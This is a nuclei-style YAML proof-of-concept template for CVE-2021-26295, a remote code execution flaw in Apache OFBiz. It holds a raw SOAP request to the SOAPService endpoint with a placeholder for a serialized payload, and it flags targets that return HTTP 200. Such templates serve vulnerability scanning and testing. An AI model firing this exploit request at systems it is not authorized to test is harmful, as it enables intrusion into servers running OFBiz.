poc/custom-pocs/poc-yaml-apache-ofbiz-cve-2021-26295-rce.yaml

id: poc-yaml-apache-ofbiz-cve-2021-26295-rce

info:
  name: poc-yaml-apache-ofbiz-cve-2021-26295-rce
  author: 小z
  severity: critical
  tags: xray-converted,rce,cve-2021-26295
  reference:
    - https://github.com/yumusb/CVE-2021-26295-POC

http:
  - raw:
      - |
        POST /webtools/control/SOAPService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version='1.0' encoding='UTF-8'?>
        <soapenv:Envelope
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header/>
        <soapenv:Body>
        <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
        <ns1:cus-obj>{{s2}}</ns1:cus-obj>
        </ns1:clearAllEntityCaches>
        </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200